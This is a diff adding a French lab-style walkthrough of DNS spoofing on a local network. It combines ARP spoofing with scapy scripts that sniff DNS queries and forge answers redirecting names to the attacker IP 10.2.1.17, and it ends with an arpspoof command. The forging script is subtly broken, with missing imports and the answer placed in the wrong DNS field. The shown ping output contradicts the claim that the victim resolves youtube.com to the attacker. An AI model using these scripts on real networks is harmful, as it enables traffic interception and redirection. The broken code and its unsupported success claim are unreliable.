@@ -222,3 +222,77 @@ while True:
 	sendp(pk2, iface="enp0s3")
 ```
 
+## 2. DNS spoofing
+On lance notre arpspoofing en arrière plan
+```
+root@debian:/home/toto# python3 script_arpspoofing.py > /dev/null &
+```
+
+Puis le script pour détecter les requêtes DNS :
+```
+root@debian:/home/toto# python3 script_dns.py > res.txt
+```
+
+```
+from scapy.all import sniff, DNS, UDP
+
+def print_dns_packet(packet):
+	print(packet.show())
+
+sniff(filter="udp port 53", prn=print_dns_packet, count=10)
+```
+
+*La victime ping example.com*
+
+```
+root@debian:/home/toto# cat res.txt | grep .com
+	| qname     = b'example.com'
+```
+
+Répondre au requêtes DNS :
+```
+from scapy.all import sniff, DNS, UDP
+
+def print_dns_packet(packet):
+    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
+    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
+    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
+    dns = DNS(
+        id=packet[DNS].id,
+        qd=packet[DNS].qd,
+        aa=1,
+        rd=0,
+        qr=1,
+        qdcount=1,
+        ancount=1,
+        nscount=0,
+        arcount=0,
+        ar=DNSRR(
+            rrname=packet[DNS].qd.qname,
+            type='A',
+            ttl=600,
+            rdata='10.2.1.17')
+        )
+        
+    response_p = eth / ip / udp / dns
+    sendp(response_p)
+
+sniff(filter="udp port 53", prn=print_dns_packet, count=10)
+```
+
+La victime crois que l'ip de notre machine attaquante (10.2.1.17) est l'ip de youtube.com :
+```
+root@localhost toto]# ping youtube.com
+PING youtube.com (216.58.213.78) 56(84) bytes of data.
+64 bytes from 1hr25s01-in-f78.1e100.net (216.58.213.78): icmp_seq=1 ttl=58 time=50.3 ms
+From 10.2.1.17 (10.2.1.17) icmp_seq=2 Redirect Host (New nexthop: _gateway (10.2.1.254)) 64 bytes from par21s18-in-f14.1e100.net (216.58.213.78): icmp_seq=2 ttl=58 time=46.2 ms
+From 10.2.1.17 (10.2.1.17) icmp_seq=3 Redirect Host (New nexthop: _gateway (10.2.1.254)) 64 bytes from 1hr25s01-in-f78.1e100.net (216.58.213.78): icmp_seq=3 ttl=58 time=37.5 ms
+From 10.2.1.17 (10.2.1.17) icmp_seq=4 Redirect Host (New nexthop: _gateway (10.2.1.254)) 64 bytes from 1hr25s01-in-f14.1e100.net (216.58.213.78): icmp_seq=4 ttl=58 time=30.6 ms
+From 10.2.1.17 (10.2.1.17) icmp_seq=5 Redirect Host (New nexthop: _gateway (10.2.1.254)) 64 bytes from 1hr25s01-in-f78.1e100.net (216.58.213.78): icmp_seq=5 ttl=58 time=31.8 ms
+```
+
+
+
+```
+arpspoof -t 10.2.1.254 10.2.1.48 -r > /dev/null 2>&1 &
+```
